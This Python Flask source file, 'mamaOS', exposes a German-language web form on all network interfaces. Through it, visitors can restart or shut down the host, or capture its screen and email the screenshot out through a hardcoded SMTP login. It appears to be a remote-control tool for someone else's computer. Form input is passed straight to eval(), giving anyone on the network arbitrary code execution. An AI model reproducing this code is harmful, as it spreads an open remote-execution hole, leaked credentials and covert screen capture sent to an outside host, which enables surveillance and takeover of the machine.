from flask import Flask, request
import pyautogui
import smtplib
import tempfile
import os
from email.message import EmailMessage
from jinja2 import Template

HTML = """<!DOCTYPE html>
<html lang="en">
  <head>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@100..900&display=swap"
      rel="stylesheet"
    />
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>mamaOS</title>
    <link
      rel="icon"
      type="image/x-icon"
      href="http://harimtim.xyz/Storage/mamaOS_logo_rmbg.png"
    />
  </head>

  <style>
    body,
    html {
      height: 100%;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: #333333d0;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    form {
      width: 400px;
      background-color: rgba(255, 255, 255, 0.8);
      border-radius: 10px;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-bottom: 50px;
      animation: border 4s infinite;
      box-shadow: 0px 0px 10px 0px purple;
      position: relative;
    }

    #os {
      margin-top: 50px;
      font-size: 30px;
      color: white;
      background-color: #c0c0c0;
      width: calc(80% - 40px);
      padding-block: 10px;
      display: flex;
      justify-content: center;
      align-items: center;
      border-radius: 10px;
      animation: os 10s infinite;
    }

    form input {
      margin-top: 10px;
      font-size: 16px;
      font-family: "consolas", "Roboto Slab";
      width: calc(78% - 20px);
      padding-inline: 12px;
      padding-block: 10px;
      border-radius: 5px;
      border: 1px solid;
    }

    .cmd {
      margin-top: 50px;
    }

    form button {
      background-color: #ccccccaf;
      border: 1px solid;
      border-radius: 5px;
      margin-top: 35px;
      font-size: 16px;
      padding: 10px;
      width: 80%;
      cursor: pointer;
      transition: 0.5s;
    }

    form button:hover {
      background-color: rgba(32, 178, 171, 0.63);
      color: white;
      box-shadow: 0px 0px 10px 0px white;
      animation: os 2s ease-in-out infinite;
    }

    @keyframes os {
      0% {
        background-color: #c0c0c0;
      }
      25% {
        background-color: #2ad7ee83;
      }
      50% {
        background-color: #ff343467;
      }
      75% {
        background-color: #dfff2cc0;
      }
      100% {
        background-color: #c0c0c0;
      }
    }

    @keyframes border {
      0% {
        box-shadow: 0px 0px 10px 0px purple;
      }
      25% {
        box-shadow: 0px 0px 10px 0px blue;
      }
      50% {
        box-shadow: 0px 0px 10px 0px green;
      }
      75% {
        box-shadow: 0px 0px 10px 0px orange;
      }
      100% {
        box-shadow: 0px 0px 10px 0px red;
      }
    }

    #har {
      position: absolute;
      color: gray;
      font-size: 10px;
      left: 10px;
      top: 10px;
    }

    #vs {
      position: absolute;
      color: gray;
      font-size: 10px;
      right: 10px;
      bottom: 10px;
    }

    @media (max-width: 480px) {
      form {
        width: 100%;
        height: calc(100% - 50px);
        border-radius: 0px;
        position: relative;
      }

      form button {
        position: absolute;
        bottom: 20%;
      }

      #os {
        width: calc(80% - 10px);
        position: absolute;
        top: 5%;
      }

      #extra {
        position: absolute;
        top: 53%;
      }

      #text {
        position: absolute;
        top: 35%;
      }
    }
  </style>

  <script>
    function showInfo(info) {
      if (info) {
        window.alert(info);
      }
    }
    window.onload = function () {
      const info = "{{ info }}";
      showInfo(info);
    };
  </script>

  <body>
    <form action="" method="post">
      <span id="os">mamaOS</span>
      <span id="har">harimtim</span>
      <span id="vs">1.0.2</span>

      <input
        class="cmd"
        type="text"
        name="text"
        id="text"
        required
        placeholder="Befehl: "
      />
      <input type="text" name="extra" id="extra" placeholder="Zusatz: " />
      <button type="submit">Senden</button>
    </form>
  </body>
</html>
"""

def neustarten(extra=""):
    os.system("shutdown -r -t 10")

def ausschalten(extra=""):
    os.system("shutdown -s -t 10")

def bildschirm(extra=""):
    x = pyautogui.screenshot()
    x.save(f"{tempfile.gettempdir()}/mamaOS_bildschirm.png")


    if len(extra) < 5:
        extra = "harimtim@icloud.com"


    msg = EmailMessage()
    msg["To"] = extra
    msg["From"] = "MamaOS <harimtim@harimtim.xyz>"
    msg["Subject"] = "Bildschirm | MamaOS"

    with open(f"{tempfile.gettempdir()}/mamaOS_bildschirm.png", "rb") as file:
        image_data = file.read()

    msg.add_attachment(image_data, maintype="application", subtype="octet-stream", filename="Screenshot.png")         

    try:
        with smtplib.SMTP("mail.harimtim.xyz", 587) as server:
            server.starttls()
            server.login("harimtim@harimtim.xyz", "harimtim")
            server.send_message(msg)
    except:
        print("Fehler")

app = Flask(__name__)

@app.route("/", methods=["POST", "GET"])
def index():
    if request.method == "GET":
        return Template(HTML).render(info="")
    if request.method == "POST":
        extra = request.form["extra"]
        action = request.form["text"]
        try:
            eval(f"{action.lower()}(extra='{extra.lower()}')")
            return Template(HTML).render(info=f"Befehl wurde erfolgreich ausgeführt.")
        except Exception as e:
            return Template(HTML).render(info=f"Ein Fehler ist aufgetreten!")

app.run(host="0.0.0.0", port=80, debug=True)
